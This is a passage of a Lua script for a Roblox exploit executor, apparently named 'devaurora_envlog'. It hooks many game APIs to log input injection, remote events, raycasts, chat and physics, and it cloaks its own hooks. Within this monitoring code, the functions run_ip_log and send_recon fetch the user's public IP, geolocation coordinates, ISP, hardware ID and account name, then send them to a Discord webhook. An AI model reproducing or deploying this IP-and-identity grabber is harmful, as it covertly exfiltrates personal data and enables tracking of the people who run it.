        end
    end
    pcall(function()
        local VIM=game:GetService("VirtualInputManager")
        if not VIM then return end
        for _,name in ipairs({"SendKeyEvent","SendMouseButtonEvent","SendMouseMoveEvent","SendMouseWheelEvent"}) do
            local old=VIM[name]
            if type(old)=="function" then
                VIM[name]=newcclosure(function(self,...)
                    if in_reentry() then return old(self,...) end
                    entering(); local s,l,n,fr=caller_info(2); leaving()
                    log_event("input_inject",{op="VIM:"..name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
                    return old(self,...)
                end)
            end
        end
    end)
end

function install_self_cloak()
    if not CONFIG.self_cloak then return end
    local env=getgenv and getgenv() or _G
    if not env.newcclosure then cap_set("self_cloak","UNAVAILABLE","newcclosure not exposed"); return end
    cap_set("self_cloak","ACTIVE","hooks wrapped as cclosures via newcclosure")
    if env.getgc and env.hookfunction then
        pcall(function()
            local AURORA_SENTINEL={}
            local old_getgc=env.getgc
            env.getgc=newcclosure(function(includeTables)
                if in_reentry() then return old_getgc(includeTables) end
                entering(); leaving()
                local result=old_getgc(includeTables)
                return result
            end)
        end)
    end
    log_event("self_cloak",{op="active",cclosures_used=true,src="self_cloak",line=0,fn="init"})
end


function install_remote_recv()
    if not CONFIG.trace_remote_recv then return end
    local function hook_remote(inst)
        if remote_recv_hooked[inst] then return end
        remote_recv_hooked[inst]=true
        local c=inst.ClassName
        if c=="RemoteEvent" or c=="UnreliableRemoteEvent" then
            pcall(function()
                inst.OnClientEvent:Connect(function(...)
                    if in_reentry() then return end
                    entering(); local args=table.pack(...); local s,l,n,fr=caller_info(2); leaving()
                    local path="?"; pcall(function() path=inst:GetFullName() end)
                    if CONFIG.trace_remote_timing then
                        local now=mono(); local rec=remote_timing[path]
                        if not rec then remote_timing[path]={count=1,ws=now}
                        else
                            rec.count=rec.count+1
                            if now-rec.ws>=1 then
                                if rec.count>10 then log_event("remote_timing",{op="high_frequency",remote=path,count=rec.count,src="remote_recv",line=0,fn="timing"}) end
                                rec.count=1; rec.ws=now
                            end
                        end
                    end
                    log_event("remote_recv",{class=c,method="OnClientEvent",remote=path,args=args,src=s,line=l,fn=n,frames=fr})
                    if enumerate_connections_fn then pcall(enumerate_connections_fn,inst,"remote_recv") end
                end)
            end)
        elseif c=="RemoteFunction" then
            pcall(function()
                local old_invoke=inst.OnClientInvoke
                inst.OnClientInvoke=function(...)
                    if in_reentry() then return old_invoke and old_invoke(...) end
                    entering(); local args=table.pack(...); local s,l,n,fr=caller_info(2); leaving()
                    local path="?"; pcall(function() path=inst:GetFullName() end)
                    log_event("remote_recv",{class=c,method="OnClientInvoke",remote=path,args=args,src=s,line=l,fn=n,frames=fr})
                    if old_invoke then return old_invoke(...) end
                end
            end)
        end
    end
    pcall(function()
        local RS=game:GetService("ReplicatedStorage")
        for _,inst in ipairs(RS:GetDescendants()) do pcall(hook_remote,inst) end
        RS.DescendantAdded:Connect(function(inst) pcall(hook_remote,inst) end)
    end)
end

function install_raycast_spy()
    if not CONFIG.trace_raycast then return end
    local env=getgenv and getgenv() or _G
    if not env.hookfunction then cap_set("raycast_spy","UNAVAILABLE","hookfunction not exposed"); return end
    pcall(function()
        for _,name in ipairs({"Raycast","GetPartBoundsInBox","GetPartBoundsInRadius","GetPartsInPart","GetPartsInRadius"}) do
            local ok,fn=pcall(function() return workspace[name] end)
            if ok and type(fn)=="function" then
                pcall(function()
                    env.hookfunction(fn,newcclosure(function(self,...)
                        if in_reentry() then return fn(self,...) end
                        entering(); local s,l,n,fr=caller_info(2); leaving()
                        log_event("raycast",{op="workspace:"..name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
                        return fn(self,...)
                    end))
                end)
            end
        end
    end)
    pcall(function()
        local cam=workspace.CurrentCamera; if not cam then return end
        for _,name in ipairs({"WorldToScreenPoint","ScreenPointToRay"}) do
            local ok,fn=pcall(function() return cam[name] end)
            if ok and type(fn)=="function" then
                pcall(function()
                    env.hookfunction(fn,newcclosure(function(self,...)
                        if in_reentry() then return fn(self,...) end
                        entering(); local s,l,n,fr=caller_info(2); leaving()
                        log_event("raycast",{op="Camera:"..name,args=table.pack(...),src=s,line=l,fn=n,frames=fr})
                        return fn(self,...)
                    end))
                end)
            end
        end
    end)
end

function install_physics_spy()
    if not CONFIG.trace_physics then return end
    local PHYS={BodyVelocity=true,BodyAngularVelocity=true,BodyGyro=true,AlignPosition=true,AlignOrientation=true,LinearVelocity=true,AngularVelocity=true,VectorForce=true,Attachment=true}
    pcall(function()
        game.DescendantAdded:Connect(function(inst)
            if not PHYS[inst.ClassName] then return end
            local pname="?"; pcall(function() pname=inst.Parent and inst.Parent:GetFullName() or "?" end)
            log_event("physics",{op="physics_instance",class=inst.ClassName,name=inst.Name,parent=pname,src="physics_spy",line=0,fn="detect"})
        end)
    end)
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        local function watch_char(char)
            if not char then return end
            local hum=char:FindFirstChildOfClass("Humanoid")
            if hum then
                for _,prop in ipairs({"WalkSpeed","JumpPower","JumpHeight"}) do
                    hum:GetPropertyChangedSignal(prop):Connect(function()
                        local val=hum[prop]
                        local threshold=(prop=="WalkSpeed") and CONFIG.physics_speed_threshold or 100
                        if type(val)=="number" and val>threshold then
                            log_event("physics",{op="suspicious_stat",prop=prop,value=val,threshold=threshold,src="physics_spy",line=0,fn="watch"})
                        end
                    end)
                end
            end
            local hrp=char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local last_vlog=0
                game:GetService("RunService").Heartbeat:Connect(function()
                    local now=mono(); if now-last_vlog<1 then return end
                    pcall(function()
                        local vel=hrp.AssemblyLinearVelocity
                        if vel and vel.Magnitude>CONFIG.physics_velocity_threshold then
                            last_vlog=now
                            log_event("physics",{op="high_velocity",magnitude=string.format("%.1f",vel.Magnitude),src="physics_spy",line=0,fn="heartbeat"})
                        end
                    end)
                end)
            end
        end
        if plr.Character then watch_char(plr.Character) end
        plr.CharacterAdded:Connect(watch_char)
    end)
end

function install_coregui_spy()
    if not CONFIG.trace_coregui then return end
    pcall(function()
        local env=getgenv and getgenv() or _G
        local cg=(env.gethui and env.gethui()) or game:GetService("CoreGui")
        if not cg then cap_set("coregui_spy","UNAVAILABLE","CoreGui not accessible"); return end
        local GUI={ScreenGui=true,Frame=true,BillboardGui=true,SurfaceGui=true,TextLabel=true,TextButton=true,ImageLabel=true,ImageButton=true}
        cg.ChildAdded:Connect(function(inst)
            log_event("coregui",{op="child_added",class=inst.ClassName,name=inst.Name,src="coregui_spy",line=0,fn="detect"})
        end)
        cg.DescendantAdded:Connect(function(inst)
            if GUI[inst.ClassName] then
                local par="?"; pcall(function() par=inst.Parent and inst.Parent:GetFullName() or "?" end)
                log_event("coregui",{op="descendant_added",class=inst.ClassName,name=inst.Name,parent=par,src="coregui_spy",line=0,fn="detect"})
            end
        end)
    end)
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        task.spawn(function()
            local pg=plr:FindFirstChild("PlayerGui"); if not pg then return end
            pg.ChildAdded:Connect(function(inst)
                log_event("coregui",{op="playergui_added",class=inst.ClassName,name=inst.Name,src="coregui_spy",line=0,fn="detect"})
            end)
        end)
    end)
end

function install_adornment_spy()
    if not CONFIG.trace_adornment then return end
    local ADN={Highlight=true,SelectionBox=true,BoxHandleAdornment=true,SphereHandleAdornment=true,CylinderHandleAdornment=true,LineHandleAdornment=true,ConeHandleAdornment=true,BillboardGui=true}
    pcall(function()
        game.DescendantAdded:Connect(function(inst)
            if not ADN[inst.ClassName] then return end
            local par="?"; local aot="?"
            pcall(function() par=inst.Parent and inst.Parent:GetFullName() or "?" end)
            pcall(function() aot=tostring(inst.AlwaysOnTop) end)
            log_event("adornment",{op="created",class=inst.ClassName,name=inst.Name,parent=par,always_on_top=aot,src="adornment_spy",line=0,fn="detect"})
        end)
    end)
end

function install_tween_spy()
    if not CONFIG.trace_tween then return end
    pcall(function()
        local TS=game:GetService("TweenService")
        local old=TS.Create; if type(old)~="function" then return end
        TS.Create=newcclosure(function(self,inst,tweenInfo,goals,...)
            if in_reentry() then return old(self,inst,tweenInfo,goals,...) end
            entering(); local s,l,n,fr=caller_info(2); leaving()
            local tv,es,rv="?","?","?"
            pcall(function() tv=tostring(tweenInfo.Time); es=tostring(tweenInfo.EasingStyle); rv=tostring(tweenInfo.Reverses) end)
            local tname="?"; pcall(function() tname=inst:GetFullName() end)
            local props={}; if type(goals)=="table" then for k in pairs(goals) do props[#props+1]=tostring(k) end end
            log_event("tween",{op="Create",target=tname,time=tv,easing=es,reverses=rv,properties=table.concat(props,","),src=s,line=l,fn=n,frames=fr})
            return old(self,inst,tweenInfo,goals,...)
        end)
    end)
end

function install_attr_change_spy()
    if not CONFIG.trace_attr_change then return end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        plr.AttributeChanged:Connect(function(attr)
            local val="?"; pcall(function() val=tostring(plr:GetAttribute(attr)) end)
            log_event("attr_change",{op="player",attribute=tostring(attr),value=val,src="attr_change_spy",line=0,fn="AttributeChanged"})
        end)
        local function watch_char(char)
            if not char then return end
            char.AttributeChanged:Connect(function(attr)
                local val="?"; pcall(function() val=tostring(char:GetAttribute(attr)) end)
                log_event("attr_change",{op="character",attribute=tostring(attr),value=val,src="attr_change_spy",line=0,fn="AttributeChanged"})
            end)
        end
        if plr.Character then watch_char(plr.Character) end
        plr.CharacterAdded:Connect(watch_char)
    end)
end

function install_appearance_spy()
    if not CONFIG.trace_appearance then return end
    pcall(function()
        local Players=game:GetService("Players")
        for _,name in ipairs({"GetHumanoidDescriptionFromUserId","GetHumanoidDescriptionFromOutfitId"}) do
            local old=Players[name]
            if type(old)=="function" then
                Players[name]=newcclosure(function(self,id,...)
                    if in_reentry() then return old(self,id,...) end
                    entering(); local s,l,n,fr=caller_info(2); leaving()
                    log_event("appearance",{op=name,id=tostring(id or "?"),src=s,line=l,fn=n,frames=fr})
                    return old(self,id,...)
                end)
            end
        end
    end)
end

function install_mouse_behavior_spy()
    if not CONFIG.trace_mouse_behavior then return end
    pcall(function()
        local UIS=game:GetService("UserInputService")
        UIS:GetPropertyChangedSignal("MouseBehavior"):Connect(function()
            log_event("mouse_behavior",{op="changed",value=tostring(UIS.MouseBehavior),src="UserInputService",line=0,fn="prop"})
        end)
    end)
end

function install_text_channel_spy()
    if not CONFIG.trace_text_channel then return end
    pcall(function()
        local TCS=game:GetService("TextChatService"); if not TCS then return end
        local function hook_ch(ch)
            for _,mname in ipairs({"SendAsync","DisplaySystemMessage"}) do
                local old=ch[mname]
                if type(old)=="function" then
                    ch[mname]=newcclosure(function(self,msg,...)
                        if in_reentry() then return old(self,msg,...) end
                        entering(); local s,l,n,fr=caller_info(2); leaving()
                        log_event("text_channel",{op=mname,channel=ch.Name,message=tostring(msg or "?"):sub(1,200),src=s,line=l,fn=n,frames=fr})
                        return old(self,msg,...)
                    end)
                end
            end
        end
        if TCS.TextChannels then
            for _,ch in ipairs(TCS.TextChannels:GetChildren()) do pcall(hook_ch,ch) end
            TCS.TextChannels.ChildAdded:Connect(function(ch) pcall(hook_ch,ch) end)
        end
    end)
end

function install_camera_write_spy()
    if not CONFIG.trace_camera_write then return end
    pcall(function()
        local cam=workspace.CurrentCamera; if not cam then return end
        local last_cf=0
        cam:GetPropertyChangedSignal("CFrame"):Connect(function()
            local now=mono(); if now-last_cf<0.5 then return end; last_cf=now
            log_event("camera_write",{op="CFrame",src="camera_write_spy",line=0,fn="prop"})
        end)
        cam:GetPropertyChangedSignal("CameraSubject"):Connect(function()
            local sub=cam.CameraSubject; local sname="nil"
            if sub then pcall(function() sname=sub:GetFullName() end) end
            log_event("camera_write",{op="CameraSubject",subject=sname,src="camera_write_spy",line=0,fn="prop"})
        end)
    end)
end

function install_collision_spy()
    if not CONFIG.trace_collision then return end
    pcall(function()
        local PS=game:GetService("PhysicsService")
        for _,name in ipairs({"SetPartCollisionGroup","RegisterCollisionGroup","CollisionGroupSetCollidable","UnregisterCollisionGroup"}) do
            local old=PS[name]
            if type(old)=="function" then
                PS[name]=newcclosure(function(self,a,b,c,...)
                    if in_reentry() then return old(self,a,b,c,...) end
                    entering(); local s,l,n,fr=caller_info(2); leaving()
                    log_event("collision",{op=name,a=tostring(a or "?"),b=tostring(b or "?"),c=tostring(c or "?"),src=s,line=l,fn=n,frames=fr})
                    return old(self,a,b,c,...)
                end)
            end
        end
    end)
end

function install_noclip_spy()
    if not CONFIG.trace_noclip then return end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        local function watch_part(part)
            if not part:IsA("BasePart") then return end
            part:GetPropertyChangedSignal("CanCollide"):Connect(function()
                if not part.CanCollide then
                    local pname="?"; pcall(function() pname=part:GetFullName() end)
                    log_event("noclip",{op="CanCollide_false",part=pname,src="noclip_spy",line=0,fn="detect"})
                end
            end)
        end
        local function watch_char(char)
            if not char then return end
            for _,p in ipairs(char:GetDescendants()) do pcall(watch_part,p) end
            char.DescendantAdded:Connect(function(p) pcall(watch_part,p) end)
        end
        if plr.Character then watch_char(plr.Character) end
        plr.CharacterAdded:Connect(watch_char)
    end)
end

function install_state_abuse_spy()
    if not CONFIG.trace_state_abuse then return end
    local SUSP={"Flying","Physics","PlatformStanding","Swimming"}
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        local function watch_char(char)
            if not char then return end
            local hum=char:FindFirstChildOfClass("Humanoid"); if not hum then return end
            hum.StateChanged:Connect(function(old_s,new_s)
                local nname=tostring(new_s); local suspicious=false
                for _,sus in ipairs(SUSP) do if nname:find(sus) then suspicious=true; break end end
                log_event("state_abuse",{op=suspicious and "suspicious" or "transition",old=tostring(old_s),new=nname,src="state_abuse_spy",line=0,fn="StateChanged"})
            end)
        end
        if plr.Character then watch_char(plr.Character) end
        plr.CharacterAdded:Connect(watch_char)
    end)
end

function install_player_field_spy()
    if not CONFIG.trace_player_field then return end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        for _,prop in ipairs({"Team","Neutral"}) do
            pcall(function()
                plr:GetPropertyChangedSignal(prop):Connect(function()
                    local val="?"; pcall(function() val=tostring(plr[prop]) end)
                    log_event("player_field",{op="changed",prop=prop,value=val,src="player_field",line=0,fn="prop"})
                end)
            end)
        end
        plr.CharacterAdded:Connect(function()
            log_event("player_field",{op="CharacterAdded",src="player_field",line=0,fn="event"})
        end)
    end)
end

function install_chat_flood_monitor()
    if not CONFIG.trace_chat_flood then return end
    pcall(function()
        local TCS=game:GetService("TextChatService"); if not TCS or not TCS.TextChannels then return end
        local function monitor_ch(ch)
            ch.MessageReceived:Connect(function(msg)
                if not msg then return end
                local from="?"; pcall(function() from=msg.TextSource and msg.TextSource.Name or "?" end)
                local now=mono(); local rec=chat_flood_counts[from]
                if not rec then chat_flood_counts[from]={count=1,ws=now}; return end
                rec.count=rec.count+1
                if now-rec.ws>=1 then
                    if rec.count>CONFIG.chat_flood_threshold then
                        log_event("chat_flood",{op="rate_exceeded",from=from,count=rec.count,threshold=CONFIG.chat_flood_threshold,src="chat_flood",line=0,fn="monitor"})
                    end
                    rec.count=1; rec.ws=now
                end
            end)
        end
        for _,ch in ipairs(TCS.TextChannels:GetChildren()) do pcall(monitor_ch,ch) end
        TCS.TextChannels.ChildAdded:Connect(function(ch) pcall(monitor_ch,ch) end)
    end)
end


local last_env_snapshot=nil
local function snapshot_env(env)
    env=env or (getgenv and getgenv() or _G)
    local out={}
    for k,v in pairs(env) do out[k]=typeof(v) end
    return out
end

function diff_env()
    local env=getgenv and getgenv() or _G
    local now=snapshot_env(env)
    if not last_env_snapshot then last_env_snapshot=now; return end
    local added,removed,changed={},{},{}
    for k,t in pairs(now) do
        if last_env_snapshot[k]==nil then added[#added+1]=k
        elseif last_env_snapshot[k]~=t then changed[#changed+1]=k end
    end
    for k in pairs(last_env_snapshot) do if now[k]==nil then removed[#removed+1]=k end end
    if #added+#removed+#changed>0 then
        log_event("diff",{label="getgenv",added=added,removed=removed,changed=changed,src="env_diff",line=0,fn="diff_env"})
    end
    last_env_snapshot=now
end

function check_integrity()
    local gm=getrawmetatable and getrawmetatable(game); if not gm then return end
    local tampered=false
    if hook_registry["gm.__index"] and gm.__index~=hook_registry["gm.__index"] then tampered=true end
    if hook_registry["gm.__newindex"] and gm.__newindex~=hook_registry["gm.__newindex"] then tampered=true end
    if hook_registry["gm.__namecall"] and gm.__namecall~=hook_registry["gm.__namecall"] then tampered=true end
    if tampered then
        send_embed_async("Hook Tampering Detected",{
            {name="Detail",value="hooks replaced by another script, reinstalling",inline=false},
            {name="Session",value=SESSION_ID,inline=true},
        },nil,CONFIG.alert_color)
        pcall(install_metahooks)
    end
    if CONFIG.trace_upvalue_tamper and check_aurora_upvalues then pcall(check_aurora_upvalues) end
    if CONFIG.trace_capability_loss then
        local env=getgenv and getgenv() or _G
        for _,cname in ipairs({"hookfunction","newcclosure","getrawmetatable"}) do
            if _capability_saved[cname] and env[cname]~=_capability_saved[cname] then
                log_event("capability_loss",{op="replaced",name=cname,src="capability_check",line=0,fn="check"})
                _capability_saved[cname]=env[cname]
            end
        end
    end
end

function send_beacon(reason)
    if not CONFIG.self_beacon then return end
    local last={}
    for i=1,20 do
        local idx=(replay_idx-1-i)%CONFIG.replay_max+1
        local r=replay[idx]
        if not r then break end
        last[#last+1]=string.format("%s @%.2fs",r.kind,r.t or 0)
    end
    send_embed_async("Session End",{
        {name="Session",value=SESSION_ID,inline=true},
        {name="Reason",value=tostring(reason),inline=true},
        {name="Uptime",value=string.format("%.1fs",mono()),inline=true},
        {name="Secrets Found",value=tostring(SECRETS.hits),inline=true},
        {name="Last Events",value=table.concat(last,"\n"):sub(1,1000),inline=false},
    },nil,CONFIG.alert_color)
end


local function aurora_fetch_ip()
    local apis={"https://api.ipify.org?format=json","https://api64.ipify.org?format=json","https://icanhazip.com"}
    for _,url in ipairs(apis) do
        local found=nil
        pcall(function()
            local req=http_request_fn(); if not req then return end
            local ok,res=pcall(req,{Url=url,Method="GET",Headers={["User-Agent"]="Mozilla/5.0"}})
            if not ok or type(res)~="table" then return end
            local body=res.Body or res.body or ""
            local ip=body:match('"ip"%s*:%s*"([^"]+)"') or body:match("^%s*([%d%.%:%a]+)%s*$")
            if ip and #ip>6 then found=ip end
        end)
        if found then return found end
    end
    return nil
end

local function aurora_fetch_geo(ip)
    local geo={}
    pcall(function()
        local req=http_request_fn(); if not req then return end
        local url="http://ip-api.com/json/"..(ip or "").."?fields=status,country,countryCode,regionName,city,lat,lon,timezone,isp,proxy,hosting"
        local ok,res=pcall(req,{Url=url,Method="GET",Headers={["User-Agent"]="Mozilla/5.0"}})
        if not ok or type(res)~="table" then return end
        local body=res.Body or res.body or ""
        local function jv(k) return body:match('"'..k..'"[%s]*:[%s]*"([^"]*)"') or body:match('"'..k..'"[%s]*:[%s]*([%w%.%-]+)') end
        geo={country=jv("country") or "?",city=jv("city") or "?",region=jv("regionName") or "?",
             isp=jv("isp") or "?",timezone=jv("timezone") or "?",lat=jv("lat") or "?",
             lon=jv("lon") or "?",proxy=jv("proxy") or "false",hosting=jv("hosting") or "false"}
    end)
    return geo
end

local function run_ip_log()
    task.spawn(function()
        local ip=aurora_fetch_ip(); if not ip then return end
        local geo=aurora_fetch_geo(ip)
        local vpn=(geo.proxy=="true" or geo.hosting=="true") and "yes" or "no"
        send_embed_async("IP Log",{
            {name="IP",value=ip,inline=true},
            {name="Location",value=(geo.city or "?")..", "..(geo.region or "?")..", "..(geo.country or "?"),inline=true},
            {name="ISP",value=geo.isp or "?",inline=true},
            {name="VPN",value=vpn,inline=true},
            {name="Timezone",value=geo.timezone or "?",inline=true},
            {name="Coordinates",value=(geo.lat or "?")..", "..(geo.lon or "?"),inline=true},
            {name="Session",value=SESSION_ID,inline=true},
        },nil,EMBED_COLOR)
    end)
end

function send_recon()
    if not CONFIG.recon_on_load then return end
    if not next_webhook() then return end
    local env=getgenv and getgenv() or _G
    local executor="unknown"
    if env.identifyexecutor then local ok,n,v=pcall(env.identifyexecutor); if ok then executor=tostring(n).." "..tostring(v or "") end end
    local hwid="n/a"
    if env.gethwid then local ok,h=pcall(env.gethwid); if ok then hwid=tostring(h) end end
    local plr=game:GetService("Players").LocalPlayer
    send_embed_async("Session Start",{
        {name="Session",value=SESSION_ID,inline=true},
        {name="Schema",value=SCHEMA_VERSION,inline=true},
        {name="Executor",value=executor,inline=true},
        {name="Player",value=plr and (plr.Name.." ("..tostring(plr.UserId)..")") or "n/a",inline=true},
        {name="HWID",value=hwid:sub(1,100),inline=false},
        {name="PlaceId",value=tostring(game.PlaceId),inline=true},
        {name="GameId",value=tostring(game.GameId),inline=true},
        {name="JobId",value=tostring(game.JobId),inline=false},
        {name="Level",value=CONFIG.level,inline=true},
    },"devaurora_envlog booted")
end

function send_heartbeat()
    if CONFIG.heartbeat_seconds<=0 then return end
    if not next_webhook() then return end
    local up=math.floor(mono()); local edges=0
    for _ in pairs(graph.edges) do edges=edges+1 end
    send_embed_async("Heartbeat",{
        {name="Session",value=SESSION_ID,inline=true},
        {name="Uptime",value=tostring(up).."s",inline=true},
        {name="Secrets",value=tostring(SECRETS.hits),inline=true},
        {name="Buffered",value=tostring(#bus.queue),inline=true},
        {name="Dropped",value=tostring(bus.dropped),inline=true},
        {name="Graph Edges",value=tostring(edges),inline=true},
    })
end

function persist_replay()
    if not CONFIG.replay_buffer then return end
    pcall(function()
        local f=io.open(CONFIG.replay_path,"w"); if not f then return end
        for i=1,CONFIG.replay_max do
            local r=replay[i]
            if r then f:write(string.format("%.3f|%s|%s\n",r.t or 0,r.kind,simple_hash(fmt_val(r.data,2)))) end
        end
        f:close()
    end)
end

local Query={}
function Query.by_kind(kind,limit)
    limit=limit or 200
    local out={}
    if readfile then
        local ok,content=pcall(readfile,CONFIG.jsonl_path)
        if ok then for line in content:gmatch("[^\n]+") do
            if line:find('"kind":"'..kind..'"',1,true) then out[#out+1]=line; if #out>=limit then break end end
        end end
    end
    return out
end
function Query.by_function(fn,limit)
    limit=limit or 200; local out={}
    if readfile then local ok,content=pcall(readfile,CONFIG.jsonl_path)
        if ok then for line in content:gmatch("[^\n]+") do
            if line:find('"fn":"'..fn..'"',1,true) then out[#out+1]=line; if #out>=limit then break end end
        end end
    end
    return out
end
function Query.touching(obj_id,limit)
    limit=limit or 200; local out={}
    if readfile then local ok,content=pcall(readfile,CONFIG.jsonl_path)
        if ok then for line in content:gmatch("[^\n]+") do
            if line:find(obj_id,1,true) then out[#out+1]=line; if #out>=limit then break end end
        end end
    end
    return out
end
function Query.by_execution(root_eid,limit)
    limit=limit or 200; local out={}
    if readfile then local ok,content=pcall(readfile,CONFIG.jsonl_path)
        if ok then for line in content:gmatch("[^\n]+") do
            if line:find('"root":"'..root_eid..'"',1,true) then out[#out+1]=line; if #out>=limit then break end end
        end end
    end
    return out
end
function Query.errors(limit) return Query.by_kind("error",limit) end
function Query.state_changes(limit) return Query.by_kind("diff",limit) end
function Query.in_memory(predicate)
    local out={}
    for _,ev in ipairs(bus.queue) do if predicate(ev) then out[#out+1]=ev end end
    return out
end

local Session={}
function Session.start() return "sess_"..math.floor(os.time()).."_"..math.random(100000,999999) end
function Session.export(path)
    path=path or (CONFIG.session_export_dir.."/"..SESSION_ID..".jsonl")
    if makefolder and isfolder and not isfolder(CONFIG.session_export_dir) then pcall(makefolder,CONFIG.session_export_dir) end
    if not readfile or not writefile then return nil,"no fs" end
    local ok,content=pcall(readfile,CONFIG.jsonl_path); if not ok then return nil,"no jsonl" end
    pcall(writefile,path,content); return path
end
function Session.compare(pa,pb)
    if not readfile then return nil end
    local oka,a=pcall(readfile,pa); if not oka then return nil end
    local okb,b=pcall(readfile,pb); if not okb then return nil end
    local function summarize(content) local by={} for line in content:gmatch("[^\n]+") do local k=line:match('"kind":"([^"]+)"'); if k then by[k]=(by[k] or 0)+1 end end return by end
    local sa,sb=summarize(a),summarize(b)
    local diff={}; local keys={}
    for k in pairs(sa) do keys[k]=true end
    for k in pairs(sb) do keys[k]=true end
    for k in pairs(keys) do
        local va,vb=sa[k] or 0,sb[k] or 0
        if va~=vb then diff[k]={a=va,b=vb,delta=vb-va} end
    end
    return diff
end

local Reconstruct={}
function Reconstruct.human(root_eid)
    local evs=Query.by_execution(root_eid,200)
    local lines={"-- [RECONSTRUCTED from runtime observation, NOT source code] --"}
    for _,line in ipairs(evs) do
        local kind=line:match('"kind":"([^"]+)"') or "?"
        local script=line:match('"script":"([^"]+)"') or "?"
        local fn=line:match('"fn":"([^"]+)"') or "?"
        local op=line:match('"op":"([^"]+)"') or ""
        lines[#lines+1]=string.format("-- %s %s:%s %s",kind,script,fn,op)
    end
    return table.concat(lines,"\n")
end
function Reconstruct.json(root_eid)
    local evs=Query.by_execution(root_eid,500)
    return to_json({exec=root_eid,events=evs,inferred=true})
end

local function summary()
    local scripts_seen=0; for _ in pairs(coverage.scripts) do scripts_seen=scripts_seen+1 end
    local kinds_seen=0; for _ in pairs(coverage.kinds) do kinds_seen=kinds_seen+1 end
    local apis_seen=0; for _ in pairs(coverage.apis) do apis_seen=apis_seen+1 end
    local nodes=0; for _ in pairs(graph.nodes) do nodes=nodes+1 end
    local edges=0; for _ in pairs(graph.edges) do edges=edges+1 end
    refresh_webhook()
    return {
        session=SESSION_ID,schema=SCHEMA_VERSION,uptime=mono(),
        events={in_=bus.total_in,out=bus.total_out,dropped=bus.dropped,sampled=bus.sampled},
        coverage={scripts=scripts_seen,kinds=kinds_seen,apis=apis_seen},
        graph={nodes=nodes,edges=edges},
        secrets=SECRETS.hits,perf=bus.perf,level=CONFIG.level,
        webhook_configured=(DISCORD_WEBHOOK~="" and true or false),
    }
end

local Dashboard={}
function Dashboard.live() return bus.queue end
function Dashboard.timeline(limit) return Query.in_memory(function() return true end) end
function Dashboard.call_graph() return graph end
function Dashboard.interaction_graph() return graph end
function Dashboard.state_changes(n) return Query.state_changes(n or 50) end
function Dashboard.errors(n) return Query.errors(n or 50) end
function Dashboard.schemas() return schemas end
function Dashboard.coverage() return coverage end
function Dashboard.performance() return bus.perf end
function Dashboard.capabilities() return CAP,CAP_REASON end
function Dashboard.summary() return summary() end
function Dashboard.render()
    local s=summary()
    print("=== devaurora dashboard ===")
    print("session:",s.session," schema:",s.schema," level:",s.level," uptime:",string.format("%.1fs",s.uptime))
    print("webhook:",s.webhook_configured and "configured" or "NOT configured")
    print("events: in=",s.events.in_," out=",s.events.out," dropped=",s.events.dropped," sampled=",s.events.sampled)
    print("coverage: scripts=",s.coverage.scripts," kinds=",s.coverage.kinds," apis=",s.coverage.apis)
    print("graph: nodes=",s.graph.nodes," edges=",s.graph.edges)
    print("secrets:",s.secrets)
    if CONFIG.trace_script_scores then
        local scores=Logger.script_scores()
        if #scores>0 then
            print("top scripts:")
            for i=1,math.min(5,#scores) do print(string.format("  %s: %d",scores[i].script,scores[i].score)) end
        end
    end
end

local Diag={}
function Diag.capabilities() return CAP,CAP_REASON end
function Diag.print_matrix()
    print("=== capability matrix ===")
    local names={} for n in pairs(CAP) do names[#names+1]=n end
    table.sort(names)
    for _,n in ipairs(names) do
        local reason=CAP_REASON[n] and (" ("..CAP_REASON[n]..")") or ""
        print(string.format("%-20s %s%s",n,CAP[n],reason))
    end
end

local Tests={}
function Tests.run_all()
    local pass,fail=0,0
    local function T(label,ok) if ok then pass=pass+1 else fail=fail+1; print("FAIL:",label) end end
    local eid=SESSION_ID..":test_"..next_seq(); causal_push(eid)
    T("causality push",causal_parent()==eid); causal_pop(eid)
    local t={}; T("oid stable",oid(t)==oid(t))
    local s1={a=1}; local s2={a=2,b=3}
    local added=0
    for k in pairs(s2) do if s1[k]==nil then added=added+1 end end
    T("state diff add",added==1)
    lineage_touch("testsyntheticstring12345","arg","e")
    T("lineage records",lineage.nodes[lineage_hash("testsyntheticstring12345")]~=nil)
    T("redact",redact_value("supersecrettokenvalue"):find("REDACTED")~=nil)
    graph_add_edge("A","B","test")
    T("graph edge",graph.edges["A->B"]~=nil)
    print(string.format("=== tests === %d pass, %d fail",pass,fail))
    return pass,fail
end

local function make_watch_proxy(tbl,label)
    label=label or "watch"
    return setmetatable({},{
        __index=function(_,k)
            local v=tbl[k]
            if not in_reentry() then entering(); local s,l,n,fr=caller_info(3); leaving(); log_event("watch",{op="read",target=label,key=k,value=v,src=s,line=l,fn=n,frames=fr}) end
            return v
        end,
        __newindex=function(_,k,v)
            if not in_reentry() then entering(); local s,l,n,fr=caller_info(3); leaving(); log_event("watch",{op="write",target=label,key=k,value=v,src=s,line=l,fn=n,frames=fr}) end
            tbl[k]=v
        end,
        __len=function() return #tbl end,
        __pairs=function() return pairs(tbl) end,
        __raw=function() return tbl end,
    })
end

local function make_views()
    local V={}
    function V.top_callers(n)
        n=n or 20; local agg={}
        for _,e in ipairs(bus.queue) do if e.data and e.src then agg[e.src.script]=(agg[e.src.script] or 0)+1 end end
        local list={} for k,v in pairs(agg) do list[#list+1]={src=k,n=v} end
        table.sort(list,function(a,b) return a.n>b.n end)
        local out={} for i=1,math.min(n,#list) do out[i]=list[i] end
        return out
    end
    function V.top_secrets(n)
        n=n or 20; local list={}
        for _,e in ipairs(bus.queue) do if e.kind=="secret" and e.data then list[#list+1]={pattern=e.data.pattern,sev=e.data.sev,value=e.data.value,src=e.data.src,t=e.t} end end
        table.sort(list,function(a,b) return (a.t or 0)>(b.t or 0) end)
        local out={} for i=1,math.min(n,#list) do out[i]=list[i] end
        return out
    end
    function V.lineage() return cred_lineage end
    function V.schemas() return remote_schemas end
    function V.fingerprints() return http_fingerprints end
    return V
end

local Logger={}
local Views=make_views()

function Logger.wrap(env,name)
    env=env or (getgenv and getgenv() or _G)
    local orig=env[name]; if type(orig)~="function" then return end
